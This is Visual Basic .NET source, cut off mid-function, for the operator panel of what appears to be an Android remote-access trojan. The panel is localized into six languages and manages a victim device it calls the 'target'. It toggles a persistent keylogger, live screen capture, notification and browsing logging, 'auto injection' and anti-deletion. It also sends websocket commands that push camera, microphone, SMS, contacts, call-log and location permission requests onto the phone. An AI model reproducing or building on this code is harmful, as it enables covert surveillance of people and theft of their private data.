Imports System.Runtime.Remoting.Contexts
Imports DrakeUI.Framework
Imports Newtonsoft.Json

Public Class profile

    Public Btcli As BTClient

    Private holdrequests As Boolean = True
    Private Sub translateme()

        prim18.Text = shownotystr


        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"

                maintabctrl.TabPages(0).Text = "عام"
                maintabctrl.TabPages(1).Text = "الصلاحيات"
                maintabctrl.TabPages(2).Text = "خيارات"
                maintabctrl.TabPages(3).Text = "النشاطات"

                stntitle.Text = "إعدادات الهاتف"
                vibtext.Text = "وضع الإهتزاز"
                dtaromtext.Text = "بيانات الهاتف"
                wifitext.Text = "وضع الواي فاي"
                Label5.Text = "مهلة الشاشة"
                Label6.Text = "سطوع الشاشة"
                Label7.Text = "حالة الصوت"
                Label4.Text = "صوت الرنين"
                Label3.Text = "صوت الموسيقة"
                Label3.Text = "صوت التنبيهات"
                Label3.Text = "صوت النظام"

                prim1.Text = "صلاحية الوصول"
                prim2.Text = "الوصول للملفات"
                prim3.Text = "الكاميرا"
                prim4.Text = "الوصول للاسماء"
                prim5.Text = "الوصول لسجل المكالمات"
                prim6.Text = "الحسابات"
                prim7.Text = "المايكروفون"
                prim8.Text = "الموقع"
                prim9.Text = "اجراء اتصال"
                prim10.Text = "إرسال رسائل"
                prim11.Text = "تعين خلفية الهاتف"
                prim12.Text = "تخطي تحسين البطارية"
                prim13.Text = "الظهور فوق التطبيقات"
                prim14.Text = "تثبيت التطبيقات"
                prim15.Text = "قراءة الرسائل"
                prim16.Text = "تعديل إعدادات الهاتف"


                optn1.Text = "الشاشة المباشرة"
                optn2.Text = "مسجل المفاتيح الدائم"
                optn3.Text = "تسجيل الإشعارات"
                optn4.Text = "تسجيل النشاطات"
                optn5.Text = "تسجيل زيارات التطبيقات"
                optn6.Text = "تسجيل زيارات المواقع"
                optn7.Text = "الإشعارات المباشرة"
                optn8.Text = "حقن تلقائي" 'Auto injection
                optn9.Text = "منع الحذف" 'Anti Delete


                srchbtn.Text = "عرض السجل"
                comboTargts.Text = "الهدف"
                Combodats.Text = "التاريخ"
                logactivitystext.Text = "• عرض السجلات."
                clrbtn.Text = "تنظيف"
                delbtn.Text = "حذف"

                Exit Select
            Case "CN" ' Chinese
                maintabctrl.TabPages(0).Text = "常规"
                maintabctrl.TabPages(1).Text = "权限"
                maintabctrl.TabPages(2).Text = "选项"
                maintabctrl.TabPages(3).Text = "活动"

                stntitle.Text = "手机设置"
                vibtext.Text = "振动模式"
                dtaromtext.Text = "移动数据"
                wifitext.Text = "WiFi 模式"
                Label5.Text = "屏幕超时"
                Label6.Text = "屏幕亮度"
                Label7.Text = "声音状态"
                Label4.Text = "铃声音量"
                Label3.Text = "音乐音量"
                Label3.Text = "通知音量"
                Label3.Text = "系统音量"

                prim1.Text = "访问权限"
                prim2.Text = "文件访问"
                prim3.Text = "相机"
                prim4.Text = "联系人访问"
                prim5.Text = "通话记录访问"
                prim6.Text = "账户"
                prim7.Text = "麦克风"
                prim8.Text = "位置"
                prim9.Text = "拨打电话"
                prim10.Text = "发送短信"
                prim11.Text = "设置手机壁纸"
                prim12.Text = "跳过电池优化"
                prim13.Text = "显示在应用程序上方"
                prim14.Text = "安装应用程序"
                prim15.Text = "读取短信"
                prim16.Text = "修改手机设置"

                optn1.Text = "实时屏幕"
                optn2.Text = "持续按键记录"
                optn3.Text = "通知记录"
                optn4.Text = "活动记录"
                optn5.Text = "应用访问记录"
                optn6.Text = "网站访问记录"
                optn7.Text = "实时通知"
                optn8.Text = "自动注入"
                optn9.Text = "防删除"


                srchbtn.Text = "查看记录"
                comboTargts.Text = "目标"
                Combodats.Text = "日期"
                logactivitystext.Text = "• 查看记录。"
                clrbtn.Text = "清理"
                delbtn.Text = "删除"
                Exit Select

            Case "RU" ' Russian
                maintabctrl.TabPages(0).Text = "Общее"
                maintabctrl.TabPages(1).Text = "Разрешения"
                maintabctrl.TabPages(2).Text = "Параметры"
                maintabctrl.TabPages(3).Text = "Активности"

                stntitle.Text = "Настройки телефона"
                vibtext.Text = "Режим вибрации"
                dtaromtext.Text = "Мобильные данные"
                wifitext.Text = "Wi-Fi режим"
                Label5.Text = "Тайм-аут экрана"
                Label6.Text = "Яркость экрана"
                Label7.Text = "Состояние звука"
                Label4.Text = "Громкость звонка"
                Label3.Text = "Громкость музыки"
                Label3.Text = "Громкость уведомлений"
                Label3.Text = "Системный звук"

                prim1.Text = "Доступ"
                prim2.Text = "Доступ к файлам"
                prim3.Text = "Камера"
                prim4.Text = "Доступ к контактам"
                prim5.Text = "Доступ к журналу звонков"
                prim6.Text = "Учетные записи"
                prim7.Text = "Микрофон"
                prim8.Text = "Местоположение"
                prim9.Text = "Совершать звонки"
                prim10.Text = "Отправка сообщений"
                prim11.Text = "Установка обоев"
                prim12.Text = "Пропустить оптимизацию батареи"
                prim13.Text = "Поверх других приложений"
                prim14.Text = "Установка приложений"
                prim15.Text = "Чтение сообщений"
                prim16.Text = "Изменение настроек телефона"

                optn1.Text = "Прямой экран"
                optn2.Text = "Постоянная запись клавиш"
                optn3.Text = "Запись уведомлений"
                optn4.Text = "Запись активности"
                optn5.Text = "Запись посещений приложений"
                optn6.Text = "Запись посещений сайтов"
                optn7.Text = "Прямые уведомления"
                optn8.Text = "Автоматическая инъекция"
                optn9.Text = "Защита от удаления"

                srchbtn.Text = "Показать журнал"
                comboTargts.Text = "Цель"
                Combodats.Text = "Дата"
                logactivitystext.Text = "• Просмотр записей."
                clrbtn.Text = "Очистить"
                delbtn.Text = "Удалить"
                Exit Select

            Case "TR" ' Turkish
                maintabctrl.TabPages(0).Text = "Genel"
                maintabctrl.TabPages(1).Text = "İzinler"
                maintabctrl.TabPages(2).Text = "Seçenekler"
                maintabctrl.TabPages(3).Text = "Etkinlikler"

                stntitle.Text = "Telefon Ayarları"
                vibtext.Text = "Titreşim Modu"
                dtaromtext.Text = "Mobil Veri"
                wifitext.Text = "Wi-Fi Modu"
                Label5.Text = "Ekran Zaman Aşımı"
                Label6.Text = "Ekran Parlaklığı"
                Label7.Text = "Ses Durumu"
                Label4.Text = "Zil Sesi"
                Label3.Text = "Müzik Sesi"
                Label3.Text = "Bildirim Sesi"
                Label3.Text = "Sistem Sesi"

                prim1.Text = "Erişim İzni"
                prim2.Text = "Dosya Erişimi"
                prim3.Text = "Kamera"
                prim4.Text = "Kişilere Erişim"
                prim5.Text = "Çağrı Kayıtlarına Erişim"
                prim6.Text = "Hesaplar"
                prim7.Text = "Mikrofon"
                prim8.Text = "Konum"
                prim9.Text = "Arama Yapma"
                prim10.Text = "Mesaj Gönderme"
                prim11.Text = "Telefon Duvar Kağıdını Ayarla"
                prim12.Text = "Pil Optimizasyonunu Atla"
                prim13.Text = "Uygulamaların Üstünde Göster"
                prim14.Text = "Uygulama Yükleme"
                prim15.Text = "Mesajları Okuma"
                prim16.Text = "Telefon Ayarlarını Düzenleme"

                optn1.Text = "Canlı Ekran"
                optn2.Text = "Kalıcı Tuş Kaydı"
                optn3.Text = "Bildirim Kaydı"
                optn4.Text = "Etkinlik Kaydı"
                optn5.Text = "Uygulama Ziyaret Kaydı"
                optn6.Text = "Site Ziyaret Kaydı"
                optn7.Text = "Canlı Bildirimler"
                optn8.Text = "Otomatik enjeksiyon"
                optn9.Text = "Silme koruması"

                srchbtn.Text = "Kaydı Görüntüle"
                comboTargts.Text = "Hedef"
                Combodats.Text = "Tarih"
                logactivitystext.Text = "• Kayıtları Görüntüle."
                clrbtn.Text = "Temizle"
                delbtn.Text = "Sil"
                Exit Select
            Case "SP" ' Spanish
                maintabctrl.TabPages(0).Text = "General"
                maintabctrl.TabPages(1).Text = "Permisos"
                maintabctrl.TabPages(2).Text = "Opciones"
                maintabctrl.TabPages(3).Text = "Eventos"

                stntitle.Text = "Configuración del Teléfono"
                vibtext.Text = "Modo Vibración"
                dtaromtext.Text = "Datos Móviles"
                wifitext.Text = "Modo Wi-Fi"
                Label5.Text = "Tiempo de Espera de Pantalla"
                Label6.Text = "Brillo de Pantalla"
                Label7.Text = "Estado del Sonido"
                Label4.Text = "Tono de Llamada"
                Label3.Text = "Volumen de Música"
                Label3.Text = "Volumen de Notificaciones"
                Label3.Text = "Volumen del Sistema"

                prim1.Text = "Permiso de Acceso"
                prim2.Text = "Acceso a Archivos"
                prim3.Text = "Cámara"
                prim4.Text = "Acceso a Contactos"
                prim5.Text = "Acceso a Registros de Llamadas"
                prim6.Text = "Cuentas"
                prim7.Text = "Micrófono"
                prim8.Text = "Ubicación"
                prim9.Text = "Realizar Llamadas"
                prim10.Text = "Enviar Mensajes"
                prim11.Text = "Configurar Fondo de Pantalla"
                prim12.Text = "Omitir Optimización de Batería"
                prim13.Text = "Mostrar sobre Aplicaciones"
                prim14.Text = "Instalar Aplicaciones"
                prim15.Text = "Leer Mensajes"
                prim16.Text = "Modificar Configuración del Teléfono"

                optn1.Text = "Pantalla en Vivo"
                optn2.Text = "Registro Permanente de Teclas"
                optn3.Text = "Registro de Notificaciones"
                optn4.Text = "Registro de Eventos"
                optn5.Text = "Registro de Visitas a Aplicaciones"
                optn6.Text = "Registro de Visitas a Sitios"
                optn7.Text = "Notificaciones en Vivo"
                optn8.Text = "Inyección automática"
                optn9.Text = "Evitar eliminación"

                srchbtn.Text = "Ver Registro"
                comboTargts.Text = "Objetivo"
                Combodats.Text = "Fecha"
                logactivitystext.Text = "• Ver los registros."
                clrbtn.Text = "Limpiar"
                delbtn.Text = "Eliminar"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                maintabctrl.TabPages(0).Text = "Geral"
                maintabctrl.TabPages(1).Text = "Permissões"
                maintabctrl.TabPages(2).Text = "Opções"
                maintabctrl.TabPages(3).Text = "Eventos"

                stntitle.Text = "Configurações do Telefone"
                vibtext.Text = "Modo de Vibração"
                dtaromtext.Text = "Dados Móveis"
                wifitext.Text = "Modo Wi-Fi"
                Label5.Text = "Tempo de Espera da Tela"
                Label6.Text = "Brilho da Tela"
                Label7.Text = "Estado do Som"
                Label4.Text = "Toque"
                Label3.Text = "Volume da Música"
                Label3.Text = "Volume das Notificações"
                Label3.Text = "Volume do Sistema"

                prim1.Text = "Permissão de Acesso"
                prim2.Text = "Acesso a Arquivos"
                prim3.Text = "Câmera"
                prim4.Text = "Acesso a Contatos"
                prim5.Text = "Acesso a Registros de Chamadas"
                prim6.Text = "Contas"
                prim7.Text = "Microfone"
                prim8.Text = "Localização"
                prim9.Text = "Realizar Chamadas"
                prim10.Text = "Enviar Mensagens"
                prim11.Text = "Configurar Papel de Parede"
                prim12.Text = "Ignorar Otimização de Bateria"
                prim13.Text = "Exibir sobre Aplicativos"
                prim14.Text = "Instalar Aplicativos"
                prim15.Text = "Ler Mensagens"
                prim16.Text = "Modificar Configurações do Telefone"

                optn1.Text = "Tela ao Vivo"
                optn2.Text = "Registro Permanente de Teclas"
                optn3.Text = "Registro de Notificações"
                optn4.Text = "Registro de Eventos"
                optn5.Text = "Registro de Visitas a Aplicativos"
                optn6.Text = "Registro de Visitas a Sites"
                optn7.Text = "Notificações ao Vivo"
                optn8.Text = "Injeção automática"
                optn9.Text = "Impedir exclusão"


                srchbtn.Text = "Ver Registro"
                comboTargts.Text = "Alvo"
                Combodats.Text = "Data"
                logactivitystext.Text = "• Ver os registros."
                clrbtn.Text = "Limpar"
                delbtn.Text = "Excluir"
                Exit Select


            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Public Sub updatestate(str As String)
        Me.Invoke(Sub()
                      mainstatelabel.Text = str
                  End Sub)
    End Sub
    Public Sub updateactivitylog(str As String)
        Me.Invoke(Sub()
                      logactivitystext.Text = str
                  End Sub)
    End Sub

    Public Sub updatesettings(vibrationEnabled As Boolean,
                              dataRoamingEnabled As Boolean,
                              screenTimeout As Integer,
                              screenBrightness As Integer)

        Me.Invoke(Sub()

                      checkvibrate.Active = vibrationEnabled
                      checkroaming.Active = dataRoamingEnabled


                      Dim timeoutMinutes As Integer = screenTimeout \ 60000


                      TrackBartimeout.Maximum = 10
                      TrackBarBrightness.Maximum = 255


                      TrackBartimeout.Value = Math.Min(timeoutMinutes, TrackBartimeout.Maximum)
                      TrackBarBrightness.Value = Math.Min(screenBrightness, TrackBarBrightness.Maximum)

                  End Sub)
    End Sub

    Public Sub updateinfotext(alllines() As String)
        Me.Invoke(Sub()


                      Try
                          If alllines Is Nothing OrElse alllines.Length < 1 Then
                              Try
                                  If alllines IsNot Nothing AndAlso alllines.Length > 0 Then
                                      infotextlog.Text = "Cant load info. " + alllines(0).Replace(SPL_LINE, "")
                                  Else
                                      infotextlog.Text = "Cant load info. (No data)"
                                  End If
                              Catch ex As Exception
                              End Try
                              Return
                          End If

                          infotextlog.Text = ""
                          For index = 0 To Math.Min(alllines.Length - 1, 46)
                              infotextlog.AppendText(alllines(index) & vbNewLine)
                          Next

                          If alllines.Length > 51 Then
                              Dim ring_max As String = alllines(51)
                              trackring.Maximum = CInt(ring_max)
                          End If
                          If alllines.Length > 52 Then
                              Dim ring_vol As String = alllines(52)
                              trackring.Value = CInt(ring_vol)
                          End If

                          If alllines.Length > 53 Then
                              Dim music_max As String = alllines(53)
                              trakmusic.Maximum = CInt(music_max)
                          End If
                          If alllines.Length > 54 Then
                              Dim music_vol As String = alllines(54)
                              trakmusic.Value = CInt(music_vol)
                          End If

                          If alllines.Length > 55 Then
                              Dim notify_max As String = alllines(55)
                              traknotify.Maximum = CInt(notify_max)
                          End If
                          If alllines.Length > 56 Then
                              Dim notify_vol As String = alllines(56)
                              traknotify.Value = CInt(notify_vol)
                          End If

                          If alllines.Length > 57 Then
                              Dim sys_max As String = alllines(57)
                              trksystm.Maximum = CInt(sys_max)
                          End If
                          If alllines.Length > 58 Then
                              Dim sys_vol As String = alllines(58)
                              trksystm.Value = CInt(sys_vol)
                          End If

                          If alllines.Length > 59 Then
                              Dim soundstate As String = alllines(59)
                              Select Case soundstate
                                  Case "0"
                                      soundonbtn.ForeColor = Color.White
                                  Case "1"
                                      vibrateonbtn.ForeColor = Color.White
                                  Case "2"
                                      soundoffbtn.ForeColor = Color.White
                              End Select
                          End If

                          If alllines.Length > 60 Then
                              Dim wifistate As String = alllines(60)
                              If wifistate = "1" Then
                                  checkwifi.Active = True
                              End If
                          End If

                      Catch ex As Exception
                          Log_e("invoke updateinfotext", EXtoString(ex))
                      End Try

                  End Sub)
    End Sub
    Public Sub updateprimes(primsjson As Dictionary(Of String, Object))
        Dim isAccessibilityService As Boolean = If(primsjson.ContainsKey("AccessibilityService"), Boolean.Parse(primsjson("AccessibilityService").ToString()), False)
        Dim isReadContacts As Boolean = If(primsjson.ContainsKey("ReadContacts"), Boolean.Parse(primsjson("ReadContacts").ToString()), False)
        Dim isReadSMS As Boolean = If(primsjson.ContainsKey("ReadSMS"), Boolean.Parse(primsjson("ReadSMS").ToString()), False)
        Dim isReadCallLog As Boolean = If(primsjson.ContainsKey("ReadCallLog"), Boolean.Parse(primsjson("ReadCallLog").ToString()), False)
        Dim isCamera As Boolean = If(primsjson.ContainsKey("Camera"), Boolean.Parse(primsjson("Camera").ToString()), False)
        Dim isGetAccounts As Boolean = If(primsjson.ContainsKey("GetAccounts"), Boolean.Parse(primsjson("GetAccounts").ToString()), False)
        Dim isRecordAudio As Boolean = If(primsjson.ContainsKey("RecordAudio"), Boolean.Parse(primsjson("RecordAudio").ToString()), False)
        Dim isLocation As Boolean = If(primsjson.ContainsKey("Location"), Boolean.Parse(primsjson("Location").ToString()), False)
        Dim isCallPhone As Boolean = If(primsjson.ContainsKey("CallPhone"), Boolean.Parse(primsjson("CallPhone").ToString()), False)
        Dim isSendSMS As Boolean = If(primsjson.ContainsKey("SendSMS"), Boolean.Parse(primsjson("SendSMS").ToString()), False)
        Dim isSetWallpaper As Boolean = If(primsjson.ContainsKey("SetWallpaper"), Boolean.Parse(primsjson("SetWallpaper").ToString()), False)
        Dim isDozeMode As Boolean = If(primsjson.ContainsKey("DozeMode"), Boolean.Parse(primsjson("DozeMode").ToString()), False)
        Dim isDrawOverlays As Boolean = If(primsjson.ContainsKey("DrawOverlays"), Boolean.Parse(primsjson("DrawOverlays").ToString()), False)
        Dim isPackageInstalls As Boolean = If(primsjson.ContainsKey("PackageInstalls"), Boolean.Parse(primsjson("PackageInstalls").ToString()), False)
        Dim isWritesettings As Boolean = If(primsjson.ContainsKey("WriteSettings"), Boolean.Parse(primsjson("WriteSettings").ToString()), False)
        Dim isFilesAccess As Boolean = If(primsjson.ContainsKey("filesaccess"), Boolean.Parse(primsjson("filesaccess").ToString()), False)

        Dim isNotifyGranted As Boolean = If(primsjson.ContainsKey("NotifyPrim"), Boolean.Parse(primsjson("NotifyPrim").ToString()), False)

        Dim isAntiDelete As Boolean = If(primsjson.ContainsKey("antdel"), Boolean.Parse(primsjson("antdel").ToString()), True)


        Me.Invoke(Sub()
                      ' Parse values once and store in local variables
                      holdrequests = True
                      checkaccess.Active = isAccessibilityService
                      checkaccess.Enabled = Not isAccessibilityService

                      checkcontact.Active = isReadContacts
                      checkcontact.Enabled = Not isReadContacts

                      checkreadsms.Active = isReadSMS
                      checkreadsms.Enabled = Not isReadSMS

                      checkcalllog.Active = isReadCallLog
                      checkcalllog.Enabled = Not isReadCallLog

                      checkcamera.Active = isCamera
                      checkcamera.Enabled = Not isCamera

                      checkaccounts.Active = isGetAccounts
                      checkaccounts.Enabled = Not isGetAccounts

                      checkmic.Active = isRecordAudio
                      checkmic.Enabled = Not isRecordAudio

                      checkloc.Active = isLocation
                      checkloc.Enabled = Not isLocation

                      checkcallph.Active = isCallPhone
                      checkcallph.Enabled = Not isCallPhone

                      checkssms.Active = isSendSMS
                      checkssms.Enabled = Not isSendSMS

                      checkwallp.Active = isSetWallpaper
                      checkwallp.Enabled = Not isSetWallpaper

                      checkbtry.Active = isDozeMode
                      checkbtry.Enabled = Not isDozeMode

                      checkdraw.Active = isDrawOverlays
                      checkdraw.Enabled = Not isDrawOverlays

                      checkinstll.Active = isPackageInstalls
                      checkinstll.Enabled = Not isPackageInstalls

                      checkwritstng.Active = isWritesettings
                      checkwritstng.Enabled = Not isWritesettings

                      checkaccfiles.Active = isFilesAccess
                      checkaccfiles.Enabled = Not isFilesAccess

                      checknotifys.Active = isNotifyGranted
                      checknotifys.Enabled = Not isNotifyGranted



                      checkantdelete.Active = isAntiDelete
                      'checkantdelete.Enabled = Not isAntiDelete

                      holdrequests = False

                  End Sub)
    End Sub

    Public Sub loadinformations()
        Dim data As New With {
                            .subcommand = "L"
                        }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Public Sub loadpermissions()
        Dim data As New With {
                            .subcommand = "L"
                        }

        Dim commandstr As String = FormatCommand("Permissions", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub
    'Public Sub loadactivitys()
    '    Dim data As New With {
    '                        .subcommand = "L"
    '                    }

    '    Dim commandstr As String = FormatCommand("Permissions", data)


    '    Dim chatData As New Dictionary(Of String, Object) From {
    '                                        {"msg", wrk},
    '                                        {"cmnd", commandstr}
    '            }
    '    BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    'End Sub
    Public Function loadoptions()
        Dim optionjson As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(Btcli.ReadOptions)
        Dim reco_activitys As String = If(optionjson.ContainsKey("Activities"), optionjson("Activities"), "0")
        Dim reco_keys As String = If(optionjson.ContainsKey("keystrokes"), optionjson("keystrokes"), "0")
        Dim reco_notifys As String = If(optionjson.ContainsKey("notifications"), optionjson("notifications"), "0")
        Dim reco_vapps As String = If(optionjson.ContainsKey("visitedapps"), optionjson("visitedapps"), "0")
        Dim reco_vlinks As String = If(optionjson.ContainsKey("visitedlinks"), optionjson("visitedlinks"), "0")
        Dim liv_notifys As String = If(optionjson.ContainsKey("livenotify"), optionjson("livenotify"), "0")
        Dim live_screen As String = If(optionjson.ContainsKey("livescreen"), optionjson("livescreen"), "0")
        Dim auto_ject As String = If(optionjson.ContainsKey("autoj"), optionjson("autoj"), "0")

        Me.Invoke(Sub()
                      If reco_keys = "1" Then
                          checkkeys.Active = True
                      End If
                      If reco_notifys = "1" Then
                          checkRnotfy.Active = True
                      End If

                      If reco_activitys = "1" Then
                          checkRactv.Active = True
                      End If

                      If reco_vapps = "1" Then
                          chkRvapps.Active = True
                      End If

                      If reco_vlinks = "1" Then
                          checkRvlinks.Active = True
                      End If


                      If liv_notifys = "1" Then
                          chkLivnotify.Active = True
                      End If
                      If live_screen = "1" Then
                          chkscrns.Active = True
                      End If
                      If auto_ject = "1" Then
                          Checkatoject.Active = True
                      End If
                  End Sub)

    End Function

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles loadworker.DoWork
        Try
            Me.Invoke(Sub()
                          maintabctrl.Enabled = False
                      End Sub)
            'reques
            Me.updatestate("loading information")
            loadinformations()
            Threading.Thread.Sleep(10)


            Me.updatestate("loading permissions")
            loadpermissions()
            Threading.Thread.Sleep(10)


            Me.updatestate("loading options")
            loadoptions()
            Threading.Thread.Sleep(10)

            'Me.updatestate("loading Records")
            'loadoptions()
            'Threading.Thread.Sleep(10)

            Me.updatestate("Ready")

            holdrequests = False
            Me.Invoke(Sub()
                          maintabctrl.Enabled = True
                      End Sub)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub profile_Load(sender As Object, e As EventArgs) Handles MyBase.Load



        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        translateme()

        statetimer.Start()
        loadworker.RunWorkerAsync()
    End Sub
    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick

        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Profilestr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Profilestr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub checkaccess_Click(sender As Object, e As EventArgs) Handles checkaccess.Click
        If Not holdrequests AndAlso checkaccess.Enabled Then
            If Not checkaccess.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "Access"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub requestprime(data As Object)
        Dim commandstr As String = FormatCommand("Permissions", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                                    {"msg", wrk},
                                                    {"cmnd", commandstr}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub
    Private Sub loadrecord(data As Object)
        Dim commandstr As String = FormatCommand("Activitys", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                                    {"msg", wrk},
                                                    {"cmnd", commandstr}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub checkcamera_Click(sender As Object, e As EventArgs) Handles checkcamera.Click
        If Not holdrequests AndAlso checkcamera.Enabled Then
            If Not checkcamera.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "CA<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkcontact_Click(sender As Object, e As EventArgs) Handles checkcontact.Click
        If Not holdrequests AndAlso checkcontact.Enabled Then
            If Not checkcontact.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "CRC<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkcalllog_Click(sender As Object, e As EventArgs) Handles checkcalllog.Click
        If Not holdrequests AndAlso checkcalllog.Enabled Then
            If Not checkcalllog.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "RCG<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkaccounts_Click(sender As Object, e As EventArgs) Handles checkaccounts.Click
        If Not holdrequests AndAlso checkaccounts.Enabled Then
            If Not checkaccounts.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "GA<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkmic_Click(sender As Object, e As EventArgs) Handles checkmic.Click
        If Not holdrequests AndAlso checkmic.Enabled Then
            If Not checkmic.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "MC<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkloc_Click(sender As Object, e As EventArgs) Handles checkloc.Click
        If Not holdrequests AndAlso checkloc.Enabled Then
            If Not checkloc.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "LOC<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkssms_Click(sender As Object, e As EventArgs) Handles checkssms.Click
        If Not holdrequests AndAlso checkssms.Enabled Then
            If Not checkssms.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "SS<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkwallp_Click(sender As Object, e As EventArgs) Handles checkwallp.Click

        If Not holdrequests AndAlso checkwallp.Enabled Then
            If Not checkwallp.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "SW<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkbtry_Click(sender As Object, e As EventArgs) Handles checkbtry.Click
        If Not holdrequests AndAlso checkbtry.Enabled Then
            If Not checkbtry.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "Doze"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkdraw_Click(sender As Object, e As EventArgs) Handles checkdraw.Click
        If Not holdrequests AndAlso checkdraw.Enabled Then
            If Not checkdraw.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "Draw"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkinstll_Click(sender As Object, e As EventArgs) Handles checkinstll.Click
        If Not holdrequests AndAlso checkinstll.Enabled Then
            If Not checkinstll.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "inst"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkreadsms_Click(sender As Object, e As EventArgs) Handles checkreadsms.Click
        If Not holdrequests AndAlso checkreadsms.Enabled Then
            If Not checkreadsms.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "RS<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub checkkeys_ValueChanged(sender As Object, value As Boolean) Handles checkkeys.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("keystrokes", "1")
        Else
            Btcli.UpdateOption("keystrokes", "0")
        End If
    End Sub

    Private Sub checkRnotfy_ValueChanged(sender As Object, value As Boolean) Handles checkRnotfy.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("notifications", "1")
        Else
            Btcli.UpdateOption("notifications", "0")
        End If
    End Sub

    Private Sub checkRactv_ValueChanged(sender As Object, value As Boolean) Handles checkRactv.ValueChanged

        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("Activities", "1")
        Else
            Btcli.UpdateOption("Activities", "0")
        End If
    End Sub

    Private Sub chkRvapps_ValueChanged(sender As Object, value As Boolean) Handles chkRvapps.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("visitedapps", "1")
        Else
            Btcli.UpdateOption("visitedapps", "0")
        End If
    End Sub

    Private Sub checkRvlinks_ValueChanged(sender As Object, value As Boolean) Handles checkRvlinks.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("visitedlinks", "1")
        Else
            Btcli.UpdateOption("visitedlinks", "0")
        End If
    End Sub

    Private Sub chkLivnotify_ValueChanged(sender As Object, value As Boolean) Handles chkLivnotify.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("livenotify", "1")
        Else
            Btcli.UpdateOption("livenotify", "0")
        End If
    End Sub

    Private Sub comboTargts_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboTargts.SelectedIndexChanged

        Select Case comboTargts.Text
            Case "keylogger"

                Dim alldates_k() As String = Btcli.keyloggs.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                If Btcli.keyloggs = "null" OrElse alldates_k.Length < 1 Then
                    Combodats.Text = "Target Date"
                    Combodats.Enabled = False
                    BTAlerter.infos(nokelogstr)
                    Return
                End If
                Combodats.Items.Clear()

                For Each datstr As String In alldates_k
                    Combodats.Items.Add(datstr)
                Next
                Combodats.Text = alldates_k(0)
                Combodats.Enabled = True

            Case "Activities"
                Dim alldates_k() As String = Btcli.activies.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                If Btcli.activies = "null" OrElse alldates_k.Length < 1 Then
                    Combodats.Text = "Target Date"
                    Combodats.Enabled = False
                    BTAlerter.infos(noactivstr)
                    Return
                End If
                Combodats.Items.Clear()

                For Each datstr As String In alldates_k
                    Combodats.Items.Add(datstr)
                Next
                Combodats.Text = alldates_k(0)
                Combodats.Enabled = True
            Case "Notifications"
                Dim alldates_k() As String = Btcli.notifications.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                If Btcli.notifications = "null" OrElse alldates_k.Length < 1 Then
                    Combodats.Text = "Target Date"
                    Combodats.Enabled = False
                    BTAlerter.infos(nontifystr)
                    Return
                End If
                Combodats.Items.Clear()

